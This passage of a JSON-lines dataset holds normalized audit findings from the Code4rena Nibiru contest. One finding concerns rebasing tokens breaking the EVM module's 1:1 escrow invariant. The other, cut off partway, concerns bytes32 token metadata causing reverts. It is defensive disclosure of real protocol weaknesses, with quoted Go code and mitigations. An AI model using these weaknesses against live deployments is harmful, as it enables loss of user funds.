---------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- |\n| [Balance changes outside of transfers](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#balance-modifications-outside-of-transfers-rebasingairdrops) | In scope |\n```\n\nThis is because for tokens that have their balance changes not necessarily through transfers, and are rebasing in nature there would be multiple rebases while the tokens are escrowed after the initial conversion from ERC20 to Bank Coin, which would then mean that by the time there is an attempt to convert the tokens back to ERC20, the balance of the tokens in the escrow would have changed (positively/negatively) completely sidestepping the invariant of 1:1 relationship between escrowed ERC20 tokens and their bank coin representations.\n\n## Impact\n\nAs already hinted under _Proof of Concept_, this bug case completely breaks the subtle invariant of 1:1 relationship between escrowed ERC20 tokens and their bank coin representations.\n\nAnd in our case, the issue manifests itself in the following two scenarios:\n\nIf cumulatively, the rebases that occur since the initial conversion from ERC20 to Bank Coin are positive, then the difference between the amount of escrowed tokens and that of bank coins would be stuck in the escrow.\n\nAlternatively, if cumulatively, the rebases that occur since the initial conversion from ERC20 to Bank Coin are negative, then the escrow balance would be insufficient to fulfil the conversion, causing the transaction to revert with insufficient balance errors.\n\n## Tool Used\n\n- Manual review\n- Similar issue from the Q2 Thorchain Contest on Code4rena [1](https://code4rena.com/reports/2024-06-thorchain#h-01-a-malicious-user-can-steal-money-out-of-the-vault-and-other-users), [2](https://github.com/code-423n4/2024-06-thorchain-findings/issues?q=is%3Aissue+Protocol+could+be+tricked+on+some+to-be+integrated+tokens+is%3Aclosed).\n- [Nibiru's documentation on intended to-be integrated tokens](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#erc20-token-behaviors-in-scope)\n- - [Weird ERC20 tokens documentation](https://github.com/d-xo/weird-erc20#balance-modifications-outside-of-transfers-rebasingairdrops)\n\n## Recommended Mitigation Steps\n\nConsider not supporting these type of tokens at all or instead provide a mechanism to handle balance changes in the escrow/EVM module.\n", "sections": {"description_md": null, "impact_md": "## Impact\n\nAs already hinted under _Proof of Concept_, this bug case completely breaks the subtle invariant of 1:1 relationship between escrowed ERC20 tokens and their bank coin representations.\n\nAnd in our case, the issue manifests itself in the following two scenarios:\n\nIf cumulatively, the rebases that occur since the initial conversion from ERC20 to Bank Coin are positive, then the difference between the amount of escrowed tokens and that of bank coins would be stuck in the escrow.\n\nAlternatively, if cumulatively, the rebases that occur since the initial conversion from ERC20 to Bank Coin are negative, then the escrow balance would be insufficient to fulfil the conversion, causing the transaction to revert with insufficient balance errors.\n\n## Tool Used\n\n- Manual review\n- Similar issue from the Q2 Thorchain Contest on Code4rena [1](https://code4rena.com/reports/2024-06-thorchain#h-01-a-malicious-user-can-steal-money-out-of-the-vault-and-other-users), [2](https://github.com/code-423n4/2024-06-thorchain-findings/issues?q=is%3Aissue+Protocol+could+be+tricked+on+some+to-be+integrated+tokens+is%3Aclosed).\n- [Nibiru's documentation on intended to-be integrated tokens](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#erc20-token-behaviors-in-scope)\n- - [Weird ERC20 tokens documentation](https://github.com/d-xo/weird-erc20#balance-modifications-outside-of-transfers-rebasingairdrops)\n", "recommendation_md": "## Recommended Mitigation Steps\n\nConsider not supporting these type of tokens at all or instead provide a mechanism to handle balance changes in the escrow/EVM module.\n", "poc_md": null, "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L567-L624\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L129-L137\n\n**container:**\n# Vulnerability details\n\n\n## Summary\n\nThe Nibiru EVM module's token conversion mechanism contains a critical vulnerability when handling rebasing tokens. The issue stems from an incorrect assumption about the 1:1 relationship between escrowed ERC20 tokens and their bank coin representations, which can be violated when token balances change outside of transfers (e.g., through rebasing) and these type of tokens are supported by Nibiru\n## Vulnerability Details\n\n### Context\n\nThe Nibiru EVM module supports converting ERC20 tokens to bank coins and vice versa. When converting from ERC20 to bank coins, the tokens are escrowed in the EVM module, and when converting back, these escrowed tokens are used to fulfill the conversion.\n\nThis logic can be seen in the `ConvertCoinToEvm`, `convertCoinToEvmBornERC20` and `convertEvmToCoin` functions in the `msg_server.go` file, see [x/evm/keeper/msg_server.go#L486-L561](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L486-L624).\n\n### Problem\n\nThe conversion mechanism assumes a static 1:1 relationship between escrowed ERC20 tokens and bank coins, as evidenced in the `convertCoinToEvmBornERC20` function that is used when [converting the bank coins back to its ERC20 representation](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L510-L513):\n\nSee https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L567-L624\n\n```go\nfunc (k Keeper) convertCoinToEvmBornERC20(\n\tctx sdk.Context,\n\tsender sdk.AccAddress,\n\trecipient gethcommon.Address,\n\tcoin sdk.Coin,\n\tfunTokenMapping evm.FunToken,\n) (*evm.MsgConvertCoinToEvmResponse, error) {\n\terc20Addr := funTokenMapping.Erc20Addr.Address\n\t// 1 | Caller transfers Bank Coins to be converted to ERC20 tokens.\n\tif err := k.Bank.SendCoinsFromAccountToModule(\n\t\tctx,\n\t\tsender,\n\t\tevm.ModuleName,\n\t\tsdk.NewCoins(coin),\n\t); err != nil {\n\t\treturn nil, errors.Wrap(err, \"error sending Bank Coins to the EVM\")\n\t}\n\n\t// 2 | EVM sends ERC20 tokens to the \"to\" account.\n\t// This should never fail due to the EVM account lacking ERc20 fund because\n\t// the an account must have sent the EVM module ERC20 tokens in the mapping\n\t// in order to create the coins originally.\n\t//\n\t// Said another way, if an asset is created as an ERC20 and some amount is\n\t// converted to its Bank Coin representation, a balance of the ERC20 is left\n\t// inside the EVM module account in order to convert the coins back to\n\t// ERC20s.\n\tactualSentAmount, _, err := k.ERC20().Transfer(\n\t\terc20Addr,\n\t\tevm.EVM_MODULE_ADDRESS,\n\t\trecipient,\n\t\tcoin.Amount.BigInt(),\n\t\tctx,\n\t)\n\tif err != nil {\n\t\treturn nil, errors.Wrap(err, \"failed to transfer ERC-20 tokens\")\n\t}\n\n\t// 3 | In the FunToken ERC20  BC conversion process that preceded this\n\t// TxMsg, the Bank Coins were minted. Consequently, to preserve an invariant\n\t// on the sum of the FunToken's bank and ERC20 supply, we burn the coins here\n\t// in the BC  ERC20 conversion.\n\tburnCoin := sdk.NewCoin(coin.Denom, sdk.NewIntFromBigInt(actualSentAmount))\n\terr = k.Bank.BurnCoins(ctx, evm.ModuleName, sdk.NewCoins(burnCoin))\n\tif err != nil {\n\t\treturn nil, errors.Wrap(err, \"failed to burn coins\")\n\t}\n\n\t// Emit event with the actual amount received\n\t_ = ctx.EventManager().EmitTypedEvent(&evm.EventConvertCoinToEvm{\n\t\tSender:               sender.String(),\n\t\tErc20ContractAddress: funTokenMapping.Erc20Addr.String(),\n\t\tToEthAddr:            recipient.String(),\n\t\tBankCoin:             burnCoin,\n\t})\n\n\treturn &evm.MsgConvertCoinToEvmResponse{}, nil\n}\n```\n\nEvidently, Nibiru makes a critical assumption (invariant) about token availability as shown in the snippet above\n\n```markdown\n    // This should never fail due to the EVM account lacking ERc20 fund because\n    // the an account must have sent the EVM module ERC20 tokens in the mapping\n    // in order to create the coins originally.\n    //\n    // Said another way, if an asset is created as an ERC20 and some amount is\n    // converted to its Bank Coin representation, a balance of the ERC20 is left\n    // inside the EVM module account in order to convert the coins back to\n    // ERC20s.\n```\n\nHowever, this assumption would be incorrect for some supported tokens like rebasing tokens, which have been hinted to be used by Nibiru as shown in the README:\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L129-L137\n\n```markdown\n### ERC20 token behaviors in scope\n\n| Question                                                                                                                                                   | Answer   |\n| ---------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- |\n| [Balance changes outside of transfers](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#balance-modifications-outside-of-transfers-rebasingairdrops) | In scope |\n```\n\nThis is because for tokens that have their balance changes not necessarily through transfers, and are rebasing in nature there would be multiple rebases while the tokens are escrowed after the initial conversion from ERC20 to Bank Coin, which would then mean that by the time there is an attempt to convert the tokens back to ERC20, the balance of the tokens in the escrow would have changed (positively/negatively) completely sidestepping the invariant of 1:1 relationship between escrowed ERC20 tokens and their bank coin representations.\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L567-L624\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L129-L137\n\n\n# Vulnerability details\n\n\n## Summary\n\nThe Nibiru EVM module's token conversion mechanism contains a critical vulnerability when handling rebasing tokens. The issue stems from an incorrect assumption about the 1:1 relationship between escrowed ERC20 tokens and their bank coin representations, which can be violated when token balances change outside of transfers (e.g., through rebasing) and these type of tokens are supported by Nibiru\n\n## Vulnerability Details\n\n### Context\n\nThe Nibiru EVM module supports converting ERC20 tokens to bank coins and vice versa. When converting from ERC20 to bank coins, the tokens are escrowed in the EVM module, and when converting back, these escrowed tokens are used to fulfill the conversion.\n\nThis logic can be seen in the `ConvertCoinToEvm`, `convertCoinToEvmBornERC20` and `convertEvmToCoin` functions in the `msg_server.go` file, see [x/evm/keeper/msg_server.go#L486-L561](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L486-L624).\n\n### Problem\n\nThe conversion mechanism assumes a static 1:1 relationship between escrowed ERC20 tokens and bank coins, as evidenced in the `convertCoinToEvmBornERC20` function that is used when [converting the bank coins back to its ERC20 representation](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L510-L513):\n\nSee https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L567-L624\n\n```go\nfunc (k Keeper) convertCoinToEvmBornERC20(\n\tctx sdk.Context,\n\tsender sdk.AccAddress,\n\trecipient gethcommon.Address,\n\tcoin sdk.Coin,\n\tfunTokenMapping evm.FunToken,\n) (*evm.MsgConvertCoinToEvmResponse, error) {\n\terc20Addr := funTokenMapping.Erc20Addr.Address\n\t// 1 | Caller transfers Bank Coins to be converted to ERC20 tokens.\n\tif err := k.Bank.SendCoinsFromAccountToModule(\n\t\tctx,\n\t\tsender,\n\t\tevm.ModuleName,\n\t\tsdk.NewCoins(coin),\n\t); err != nil {\n\t\treturn nil, errors.Wrap(err, \"error sending Bank Coins to the EVM\")\n\t}\n\n\t// 2 | EVM sends ERC20 tokens to the \"to\" account.\n\t// This should never fail due to the EVM account lacking ERc20 fund because\n\t// the an account must have sent the EVM module ERC20 tokens in the mapping\n\t// in order to create the coins originally.\n\t//\n\t// Said another way, if an asset is created as an ERC20 and some amount is\n\t// converted to its Bank Coin representation, a balance of the ERC20 is left\n\t// inside the EVM module account in order to convert the coins back to\n\t// ERC20s.\n\tactualSentAmount, _, err := k.ERC20().Transfer(\n\t\terc20Addr,\n\t\tevm.EVM_MODULE_ADDRESS,\n\t\trecipient,\n\t\tcoin.Amount.BigInt(),\n\t\tctx,\n\t)\n\tif err != nil {\n\t\treturn nil, errors.Wrap(err, \"failed to transfer ERC-20 tokens\")\n\t}\n\n\t// 3 | In the FunToken ERC20  BC conversion process that preceded this\n\t// TxMsg, the Bank Coins were minted. Consequently, to preserve an invariant\n\t// on the sum of the FunToken's bank and ERC20 supply, we burn the coins here\n\t// in the BC  ERC20 conversion.\n\tburnCoin := sdk.NewCoin(coin.Denom, sdk.NewIntFromBigInt(actualSentAmount))\n\terr = k.Bank.BurnCoins(ctx, evm.ModuleName, sdk.NewCoins(burnCoin))\n\tif err != nil {\n\t\treturn nil, errors.Wrap(err, \"failed to burn coins\")\n\t}\n\n\t// Emit event with the actual amount received\n\t_ = ctx.EventManager().EmitTypedEvent(&evm.EventConvertCoinToEvm{\n\t\tSender:               sender.String(),\n\t\tErc20ContractAddress: funTokenMapping.Erc20Addr.String(),\n\t\tToEthAddr:            recipient.String(),\n\t\tBankCoin:             burnCoin,\n\t})\n\n\treturn &evm.MsgConvertCoinToEvmResponse{}, nil\n}\n```\n\nEvidently, Nibiru makes a critical assumption (invariant) about token availability as shown in the snippet above\n\n```markdown\n    // This should never fail due to the EVM account lacking ERc20 fund because\n    // the an account must have sent the EVM module ERC20 tokens in the mapping\n    // in order to create the coins originally.\n    //\n    // Said another way, if an asset is created as an ERC20 and some amount is\n    // converted to its Bank Coin representation, a balance of the ERC20 is left\n    // inside the EVM module account in order to convert the coins back to\n    // ERC20s.\n```\n\nHowever, this assumption would be incorrect for some supported tokens like rebasing tokens, which have been hinted to be used by Nibiru as shown in the README:\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L129-L137\n\n```markdown\n### ERC20 token behaviors in scope\n\n| Question                                                                                                                                                   | Answer   |\n| ---------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- |\n| [Balance changes outside of transfers](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#balance-modifications-outside-of-transfers-rebasingairdrops) | In scope |\n```\n\nThis is because for tokens that have their balance changes not necessarily through transfers, and are rebasing in nature there would be multiple rebases while the tokens are escrowed after the initial conversion from ERC20 to Bank Coin, which would then mean that by the time there is an attempt to convert the tokens back to ERC20, the balance of the tokens in the escrow would have changed (positively/negatively) completely sidestepping the invariant of 1:1 relationship between escrowed ERC20 tokens and their bank coin representations.\n\n## Impact\n\nAs already hinted under _Proof of Concept_, this bug case completely breaks the subtle invariant of 1:1 relationship between escrowed ERC20 tokens and their bank coin representations.\n\nAnd in our case, the issue manifests itself in the following two scenarios:\n\nIf cumulatively, the rebases that occur since the initial conversion from ERC20 to Bank Coin are positive, then the difference between the amount of escrowed tokens and that of bank coins would be stuck in the escrow.\n\nAlternatively, if cumulatively, the rebases that occur since the initial conversion from ERC20 to Bank Coin are negative, then the escrow balance would be insufficient to fulfil the conversion, causing the transaction to revert with insufficient balance errors.\n\n## Tool Used\n\n- Manual review\n- Similar issue from the Q2 Thorchain Contest on Code4rena [1](https://code4rena.com/reports/2024-06-thorchain#h-01-a-malicious-user-can-steal-money-out-of-the-vault-and-other-users), [2](https://github.com/code-423n4/2024-06-thorchain-findings/issues?q=is%3Aissue+Protocol+could+be+tricked+on+some+to-be+integrated+tokens+is%3Aclosed).\n- [Nibiru's documentation on intended to-be integrated tokens](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#erc20-token-behaviors-in-scope)\n- - [Weird ERC20 tokens documentation](https://github.com/d-xo/weird-erc20#balance-modifications-outside-of-transfers-rebasingairdrops)\n\n## Recommended Mitigation Steps\n\nConsider not supporting these type of tokens at all or instead provide a mechanism to handle balance changes in the escrow/EVM module.\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L567-L624\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L129-L137\n\n\n# Vulnerability details\n\n\n## Summary\n\nThe Nibiru EVM module's token conversion mechanism contains a critical vulnerability when handling rebasing tokens. The issue stems from an incorrect assumption about the 1:1 relationship between escrowed ERC20 tokens and their bank coin representations, which can be violated when token balances change outside of transfers (e.g., through rebasing) and these type of tokens are supported by Nibiru\n\n## Vulnerability Details\n\n### Context\n\nThe Nibiru EVM module supports converting ERC20 tokens to bank coins and vice versa. When converting from ERC20 to bank coins, the tokens are escrowed in the EVM module, and when converting back, these escrowed tokens are used to fulfill the conversion.\n\nThis logic can be seen in the `ConvertCoinToEvm`, `convertCoinToEvmBornERC20` and `convertEvmToCoin` functions in the `msg_server.go` file, see [x/evm/keeper/msg_server.go#L486-L561](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L486-L624).\n\n### Problem\n\nThe conversion mechanism assumes a static 1:1 relationship between escrowed ERC20 tokens and bank coins, as evidenced in the `convertCoinToEvmBornERC20` function that is used when [converting the bank coins back to its ERC20 representation](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L510-L513):\n\nSee https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L567-L624\n\n```go\nfunc (k Keeper) convertCoinToEvmBornERC20(\n\tctx sdk.Context,\n\tsender sdk.AccAddress,\n\trecipient gethcommon.Address,\n\tcoin sdk.Coin,\n\tfunTokenMapping evm.FunToken,\n) (*evm.MsgConvertCoinToEvmResponse, error) {\n\terc20Addr := funTokenMapping.Erc20Addr.Address\n\t// 1 | Caller transfers Bank Coins to be converted to ERC20 tokens.\n\tif err := k.Bank.SendCoinsFromAccountToModule(\n\t\tctx,\n\t\tsender,\n\t\tevm.ModuleName,\n\t\tsdk.NewCoins(coin),\n\t); err != nil {\n\t\treturn nil, errors.Wrap(err, \"error sending Bank Coins to the EVM\")\n\t}\n\n\t// 2 | EVM sends ERC20 tokens to the \"to\" account.\n\t// This should never fail due to the EVM account lacking ERc20 fund because\n\t// the an account must have sent the EVM module ERC20 tokens in the mapping\n\t// in order to create the coins originally.\n\t//\n\t// Said another way, if an asset is created as an ERC20 and some amount is\n\t// converted to its Bank Coin representation, a balance of the ERC20 is left\n\t// inside the EVM module account in order to convert the coins back to\n\t// ERC20s.\n\tactualSentAmount, _, err := k.ERC20().Transfer(\n\t\terc20Addr,\n\t\tevm.EVM_MODULE_ADDRESS,\n\t\trecipient,\n\t\tcoin.Amount.BigInt(),\n\t\tctx,\n\t)\n\tif err != nil {\n\t\treturn nil, errors.Wrap(err, \"failed to transfer ERC-20 tokens\")\n\t}\n\n\t// 3 | In the FunToken ERC20  BC conversion process that preceded this\n\t// TxMsg, the Bank Coins were minted. Consequently, to preserve an invariant\n\t// on the sum of the FunToken's bank and ERC20 supply, we burn the coins here\n\t// in the BC  ERC20 conversion.\n\tburnCoin := sdk.NewCoin(coin.Denom, sdk.NewIntFromBigInt(actualSentAmount))\n\terr = k.Bank.BurnCoins(ctx, evm.ModuleName, sdk.NewCoins(burnCoin))\n\tif err != nil {\n\t\treturn nil, errors.Wrap(err, \"failed to burn coins\")\n\t}\n\n\t// Emit event with the actual amount received\n\t_ = ctx.EventManager().EmitTypedEvent(&evm.EventConvertCoinToEvm{\n\t\tSender:               sender.String(),\n\t\tErc20ContractAddress: funTokenMapping.Erc20Addr.String(),\n\t\tToEthAddr:            recipient.String(),\n\t\tBankCoin:             burnCoin,\n\t})\n\n\treturn &evm.MsgConvertCoinToEvmResponse{}, nil\n}\n```\n\nEvidently, Nibiru makes a critical assumption (invariant) about token availability as shown in the snippet above\n\n```markdown\n    // This should never fail due to the EVM account lacking ERc20 fund because\n    // the an account must have sent the EVM module ERC20 tokens in the mapping\n    // in order to create the coins originally.\n    //\n    // Said another way, if an asset is created as an ERC20 and some amount is\n    // converted to its Bank Coin representation, a balance of the ERC20 is left\n    // inside the EVM module account in order to convert the coins back to\n    // ERC20s.\n```\n\nHowever, this assumption would be incorrect for some supported tokens like rebasing tokens, which have been hinted to be used by Nibiru as shown in the README:\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L129-L137\n\n```markdown\n### ERC20 token behaviors in scope\n\n| Question                                                                                                                                                   | Answer   |\n| ---------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- |\n| [Balance changes outside of transfers](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#balance-modifications-outside-of-transfers-rebasingairdrops) | In scope |\n```\n\nThis is because for tokens that have their balance changes not necessarily through transfers, and are rebasing in nature there would be multiple rebases while the tokens are escrowed after the initial conversion from ERC20 to Bank Coin, which would then mean that by the time there is an attempt to convert the tokens back to ERC20, the balance of the tokens in the escrow would have changed (positively/negatively) completely sidestepping the invariant of 1:1 relationship between escrowed ERC20 tokens and their bank coin representations.\n\n## Impact\n\nAs already hinted under _Proof of Concept_, this bug case completely breaks the subtle invariant of 1:1 relationship between escrowed ERC20 tokens and their bank coin representations.\n\nAnd in our case, the issue manifests itself in the following two scenarios:\n\nIf cumulatively, the rebases that occur since the initial conversion from ERC20 to Bank Coin are positive, then the difference between the amount of escrowed tokens and that of bank coins would be stuck in the escrow.\n\nAlternatively, if cumulatively, the rebases that occur since the initial conversion from ERC20 to Bank Coin are negative, then the escrow balance would be insufficient to fulfil the conversion, causing the transaction to revert with insufficient balance errors.\n\n## Tool Used\n\n- Manual review\n- Similar issue from the Q2 Thorchain Contest on Code4rena [1](https://code4rena.com/reports/2024-06-thorchain#h-01-a-malicious-user-can-steal-money-out-of-the-vault-and-other-users), [2](https://github.com/code-423n4/2024-06-thorchain-findings/issues?q=is%3Aissue+Protocol+could+be+tricked+on+some+to-be+integrated+tokens+is%3Aclosed).\n- [Nibiru's documentation on intended to-be integrated tokens](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#erc20-token-behaviors-in-scope)\n- - [Weird ERC20 tokens documentation](https://github.com/d-xo/weird-erc20#balance-modifications-outside-of-transfers-rebasingairdrops)\n\n## Recommended Mitigation Steps\n\nConsider not supporting these type of tokens at all or instead provide a mechanism to handle balance changes in the escrow/EVM module.\n"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-015", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 15, "page_start": null, "title": "Tokens such as MKR that return `bytes32` as _name_ and _symbol_ would be broken when integrated", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L119-L124\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/funtoken_from_erc20.go#L26-L52\n\n\n# Vulnerability details\n\n\n## Proof of Concept\n\nFirst note that from the readMe, Nibiru intends to be compatible with any ERC20, see:\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L119-L124\n\n```markdown\n### General questions\n\n| Question                   | Answer                    |\n| -------------------------- | ------------------------- |\n| ERC20 used by the protocol | Any (all possible ERC20s) |\n```\n\nNow take a look at https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/erc20.go#L147-L164:\n\n```go\n\nfunc (k Keeper) LoadERC20Name(\n\tctx sdk.Context, abi *gethabi.ABI, erc20 gethcommon.Address,\n) (out string, err error) {\n\treturn k.LoadERC20String(ctx, abi, erc20, \"name\")\n}\n\nfunc (k Keeper) LoadERC20Symbol(\n\tctx sdk.Context, abi *gethabi.ABI, erc20 gethcommon.Address,\n) (out string, err error) {\n\treturn k.LoadERC20String(ctx, abi, erc20, \"symbol\")\n}\n\nfunc (k Keeper) LoadERC20Decimals(\n\tctx sdk.Context, abi *gethabi.ABI, erc20 gethcommon.Address,\n) (out uint8, err error) {\n\treturn k.loadERC20Uint8(ctx, abi, erc20, \"decimals\")\n}\n```\n\nThese are helper functions that are used to load the name, symbol, and decimals of an ERC20 token contract and they help within NIbiru's scope in ensuring functionalities execute as expected, for eg we can see it being used in funtoken's implementation:\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/funtoken_from_erc20.go#L26-L52\n\n```go\nfunc (k Keeper) FindERC20Metadata(\n\tctx sdk.Context,\n\tcontract gethcommon.Address,\n) (info *ERC20Metadata, err error) {\n\t// Load name, symbol, decimals\n\tname, err := k.LoadERC20Name(ctx, embeds.SmartContract_ERC20Minter.ABI, contract)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tsymbol, err := k.LoadERC20Symbol(ctx, embeds.SmartContract_ERC20Minter.ABI, contract)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tdecimals, err := k.LoadERC20Decimals(ctx, embeds.SmartContract_ERC20Minter.ABI, contract)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn &ERC20Metadata{\n\t\tName:     name,\n\t\tSymbol:   symbol,\n\t\tDecimals: decimals,\n\t}, nil\n}\n\n```\n\nIssue however is that there is a wrong assumption that all tokens return their metadata using `string` which is wrong, this then means that when tokens that have their metadata as `bytes` are used, the functionality would be broken due to a revert that occurs when trying to load the string from here, because of the type mismatch, i.e `bytes` != `string`.\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/erc20.go#L166-L194\n\n```go\nfunc (k Keeper) LoadERC20String(\n\tctx sdk.Context,\n\terc20Abi *gethabi.ABI,\n\terc20Contract gethcommon.Address,\n\tmethodName string,\n) (out string, err error) {\n\tres, err := k.CallContract(\n\t\tctx,\n\t\terc20Abi,\n\t\tevm.EVM_MODULE_ADDRESS,\n\t\t&erc20Contract,\n\t\tfalse,\n\t\tErc20GasLimitQuery,\n\t\tmethodName,\n\t)\n\tif err != nil {\n\t\treturn out, err\n\t}\n\n\terc20Val := new(ERC20String)\n\terr = erc20Abi.UnpackIntoInterface(\n\t\terc20Val, methodName, res.Ret,\n\t)\n\tif err != nil {\n\t\treturn out, err\n\t}\n\treturn erc20Val.Value, err\n}\n\n```\n\nEvidently we expect a string value from `ERC20String` for `erc20Val` however for tokens such as [MKR](https://etherscan.io/address/0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2#readContract#F7) that have metadata fields `(name / symbol)` encoded as `bytes32` instead of a `string`, this flow wouldn't work.\n\n## Impact\n\n> 2  Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n\nSince we have broken integration for some supported tokens cause when creating the fun token mapping for these tokens we meet an error [here in the function `createFunTokenFromERC20`](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/funtoken_from_erc20.go#L104).\n\n> NB: [`createFunTokenFromERC20` and `createFunTokenFromCoin` are both called in `CreateFunToken()`](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L424-L465).\n\nAnd this window also breaks one of the core invariants stated by Nibiru, (see \"4\" below):\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L179\n\n```markdown\n## Main Invariants\n\n.. snip 3. Any bank coin on Nibiru can be used to create a canonical ERC20 representation, for which the EVM itself (the module account) will be the owner. 4. Similar to (3), any ERC20 on Nibiru can be used to create a canonical bank coin representation. The owner of the ERC20 is unbounded, while only the EVM Module account can mint the bank coin representation produced.\n```\n\n## Recommended Mitigation Steps\n\nConsider outrightly stating that not all tokens are supported, or support two types of metadata, i.e `string` and `bytes`.\n", "sections": {"description_md": null, "impact_md": "## Impact\n\n> 2  Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n\nSince we have broken integration for some supported tokens cause when creating the fun token mapping for these tokens we meet an error [here in the function `createFunTokenFromERC20`](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/funtoken_from_erc20.go#L104).\n\n> NB: [`createFunTokenFromERC20` and `createFunTokenFromCoin` are both called in `CreateFunToken()`](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L424-L465).\n\nAnd this window also breaks one of the core invariants stated by Nibiru, (see \"4\" below):\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L179\n\n```markdown\n## 